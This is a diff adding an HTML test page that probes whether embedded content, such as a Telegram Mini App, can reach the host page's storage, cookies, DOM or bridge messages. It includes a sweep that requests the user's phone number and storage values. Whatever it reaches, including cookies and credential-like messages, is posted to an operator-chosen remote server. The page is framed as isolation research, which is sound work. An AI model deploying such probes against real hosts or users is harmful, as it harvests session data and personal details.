@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Parent Reach — cross-origin isolation test</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;color:#c9d1d9;padding:12px;font-size:14px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:15px;max-width:700px;margin:0 auto 12px}
+h2{font-size:16px;color:#58a6ff;margin-bottom:3px}
+.sub{font-size:11px;color:#8b949e;line-height:1.55;margin-bottom:10px}
+button{width:100%;border:none;border-radius:8px;padding:10px;font-size:13px;font-weight:600;color:#fff;background:#1f6feb;margin-top:8px}
+button.alt{background:#30363d}
+.t{border:1px solid #21262d;border-left-width:3px;border-radius:6px;padding:8px 10px;margin:6px 0;font-size:12px}
+.t .n{font-weight:650;margin-bottom:2px}
+.t .r{font-family:ui-monospace,monospace;font-size:11.5px;word-break:break-all}
+.blocked{border-left-color:#3fb950}.reached{border-left-color:#f85149;background:#2d1214}
+.r-ok{color:#7ee787}.r-bad{color:#ff7b72;font-weight:700}.r-info{color:#e3b341}
+.verdict{border-radius:8px;padding:12px;margin:10px 0;font-weight:650;text-align:center;font-size:13px;line-height:1.5}
+.v-ok{background:#0f5323;color:#7ee787}.v-bad{background:#2d1214;color:#ff7b72}.v-wait{background:#21262d;color:#8b949e}
+code{background:#21262d;padding:1px 5px;border-radius:4px;font-size:.85em}
+input{width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:8px;padding:8px;font-size:12px;font-family:ui-monospace,monospace;margin-bottom:8px}
+pre{background:#010409;border-radius:6px;padding:8px;font-size:10.5px;max-height:200px;overflow:auto;color:#8b949e;margin-top:8px}
+</style>
+</head>
+<body>
+<div class="card">
+  <h2>Parent Reach</h2>
+  <p class="sub">Tests whether embedded content can reach the <b>embedder's</b> storage, DOM or session.
+  <b>Every technique below MUST fail.</b> Any success is a cross-origin isolation break — from a
+  Mini App context that would mean reading the host's session (e.g. <code>web.telegram.org</code>).
+  <br><br>this frame: <code id="me"></code><br>embedder: <code id="par"></code></p>
+  <input id="srv" placeholder="server .../log (optional)">
+  <div class="verdict v-wait" id="verdict">idle</div>
+  <button onclick="runAll()">Run isolation battery</button>
+  <button class="alt" onclick="bridgeSweep()">Sweep container bridge for host data (60s)</button>
+  <div id="out"></div>
+  <pre id="msgs">postMessage traffic will appear here…</pre>
+</div>
+<script>
+const Q=new URLSearchParams(location.search);
+const safeLS=k=>{try{return localStorage.getItem(k)}catch(e){return null}};
+let SRV=Q.get('srv')||safeLS('oracle_srv')||'';
+document.getElementById('srv').value=SRV;
+document.getElementById('srv').onchange=e=>{SRV=e.target.value.replace(/\/$/,'');try{localStorage.setItem('oracle_srv',SRV)}catch(_){}};
+
+let PARENT='(unknown)';
+try { PARENT = (location.ancestorOrigins && location.ancestorOrigins[0]) || document.referrer || '(none — top-level?)'; } catch(e){}
+document.getElementById('me').textContent = location.origin;
+document.getElementById('par').textContent = PARENT;
+
+const R={frame:location.origin,parent:PARENT,ua:navigator.userAgent,tests:[],reached:[]};
+function t(name, fn){
+  const d=document.createElement('div'); d.className='t blocked';
+  d.innerHTML=`<div class="n">${name}</div><div class="r r-info">…</div>`;
+  document.getElementById('out').appendChild(d);
+  let res;
+  try { res = fn(); } catch(e){ res = {reached:false, detail:`blocked: ${e.name} — ${(e.message||'').slice(0,90)}`}; }
+  const el=d.querySelector('.r');
+  el.textContent = (res.reached?'REACHED — ':'blocked — ')+res.detail;
+  el.className='r '+(res.reached?'r-bad':'r-ok');
+  d.className='t '+(res.reached?'reached':'blocked');
+  R.tests.push({name,...res});
+  if(res.reached) R.reached.push(name);
+}
+async function post(type,data){ if(!SRV)return;
+  try{ await fetch(SRV+'?type='+type,{method:'POST',
+    headers:{'Content-Type':'application/json','ngrok-skip-browser-warning':'true'},
+    body:JSON.stringify({...data,_ts:Date.now(),ua:navigator.userAgent,href:location.href})});}catch(e){} }
+
+function runAll(){
+  document.getElementById('out').innerHTML=''; R.tests=[]; R.reached=[];
+
+  t('P1 · parent.localStorage direct read', ()=>{
+    const v = parent.localStorage.length;
+    return {reached:true, detail:`read parent.localStorage — ${v} keys: `+
+      Object.keys(parent.localStorage).slice(0,8).join(',')};
+  });
+
+  t('P2 · top.localStorage direct read', ()=>{
+    const v = top.localStorage.length;
+    return {reached:true, detail:`read top.localStorage — ${v} keys`};
+  });
+
+  t('P3 · parent.document.cookie', ()=>{
+    const c = parent.document.cookie;
+    return {reached:true, detail:'cookies: '+String(c).slice(0,120)};
+  });
+
+  t('P4 · parent.document DOM access', ()=>{
+    const h = parent.document.title;
+    return {reached:true, detail:'parent title: '+String(h).slice(0,80)};
+  });
+
+  t('P5 · parent.location.href read', ()=>{
+    const h = parent.location.href;
+    return {reached:true, detail:'parent href: '+String(h).slice(0,120)};
+  });
+
+  t('P6 · parent.sessionStorage', ()=>{
+    const n = parent.sessionStorage.length;
+    return {reached:true, detail:`${n} keys`};
+  });
+
+  t('P7 · document.domain relaxation', ()=>{
+    const before = document.domain;
+    let host=''; try { host = new URL(PARENT).hostname; } catch(e){ return {reached:false, detail:'parent origin unparseable'}; }
+    const parts = host.split('.'); const reg = parts.slice(-2).join('.');
+    document.domain = reg;                       // throws in modern browsers
+    return {reached:true, detail:`document.domain set ${before} -> ${document.domain} (deprecated relaxation available)`};
+  });
+
+  t('P8 · window.opener storage', ()=>{
+    if(!window.opener) return {reached:false, detail:'no opener'};
+    const n = window.opener.localStorage.length;
+    return {reached:true, detail:`opener localStorage ${n} keys`};
+  });
+
+  t('P9 · sibling frame enumeration', ()=>{
+    const n = parent.frames.length;                       // length is allowed cross-origin
+    let reach=0;
+    for(let i=0;i<n;i++){ try{ if(parent.frames[i].localStorage) reach++; }catch(e){} }
+    return {reached: reach>0, detail:`${n} sibling frame(s), storage reachable in ${reach}`};
+  });
+
+  t('P10 · crossOriginIsolated / COOP-COEP state', ()=>{
+    return {reached:false, detail:`crossOriginIsolated=${self.crossOriginIsolated} `+
+      `secureContext=${self.isSecureContext}`};
+  });
+
+  t('P11 · Storage Access API present', ()=>{
+    const has = typeof document.requestStorageAccess === 'function';
+    return {reached:false, detail: has ? 'requestStorageAccess available (grants THIS origin its own '+
+      'third-party storage — not the parent’s; note for completeness)' : 'not available'};
+  });
+
+  t('P12 · container bridge objects', ()=>{
+    const found=[];
+    for (const k of ['TelegramWebviewProxy','Telegram','vkBridge','ReactNativeWebView','webkit','chrome'])
+      { try { if (typeof window[k] !== 'undefined') found.push(k); } catch(e){} }
+    return {reached:false, detail: found.length? 'present: '+found.join(', ') : 'none'};
+  });
+
+  const v=document.getElementById('verdict');
+  if(R.reached.length===0){ v.className='verdict v-ok';
+    v.textContent='Isolation holds — embedder storage/DOM not reachable from this frame.'; }
+  else { v.className='verdict v-bad';
+    v.innerHTML=`${R.reached.length} ISOLATION BREAK(S):<br>${R.reached.join('<br>')}`+
+      `<br><br>From a Mini App this means the host session at <code>${PARENT}</code> is readable.`; }
+  post('PARENT_REACH', R);
+}
+
+// ---- listen to everything the container sends us, and poke the bridge
+const seen=[];
+function logMsg(tag, data){
+  seen.push({tag, t:new Date().toTimeString().slice(0,8), data:String(data).slice(0,300)});
+  document.getElementById('msgs').textContent = seen.slice(-40)
+    .map(x=>`[${x.t}] ${x.tag}  ${x.data}`).join('\n');
+}
+window.addEventListener('message', ev=>{
+  logMsg('RX from '+(ev.origin||'?'), typeof ev.data==='string'?ev.data:JSON.stringify(ev.data));
+  // flag anything that looks like host credentials rather than routine bridge chatter
+  const s = typeof ev.data==='string'?ev.data:JSON.stringify(ev.data||'');
+  if(/token|session|auth|cookie|dc[0-9]|user_auth/i.test(s)){
+    R.reached.push('bridge message containing credential-like data');
+    logMsg('!! CREDENTIAL-LIKE', s.slice(0,200));
+    post('PARENT_REACH_BRIDGE_LEAK', {sample:s.slice(0,500), origin:ev.origin});
+  }
+});
+
+function bridgeSweep(){
+  logMsg('sweep','starting — poking common bridge events for 60s');
+  // Telegram Mini App bridge shape: postMessage(JSON{eventType,eventData}) to parent,
+  // and/or TelegramWebviewProxy.postEvent(type, data). Ask for things a host might
+  // over-share. All of these are documented/no-op events; we are watching the REPLIES.
+  const events = ['web_app_request_theme','web_app_request_viewport','web_app_request_safe_area',
+                  'web_app_request_content_safe_area','web_app_get_storage_values',
+                  'web_app_request_phone','web_app_invoke_custom_method'];
+  events.forEach((et,i)=>setTimeout(()=>{
+    const payload = JSON.stringify({eventType:et, eventData:{}});
+    try { parent.postMessage(payload,'*'); logMsg('TX parent', payload); } catch(e){}
+    try { if(window.TelegramWebviewProxy && TelegramWebviewProxy.postEvent){
+      TelegramWebviewProxy.postEvent(et, JSON.stringify({})); logMsg('TX proxy', et); } } catch(e){}
+  }, i*400));
+  setTimeout(()=>{ logMsg('sweep','done'); post('PARENT_REACH_SWEEP',{messages:seen.slice(-60)}); }, 60000);
+}
+</script>
+</body>
+</html>
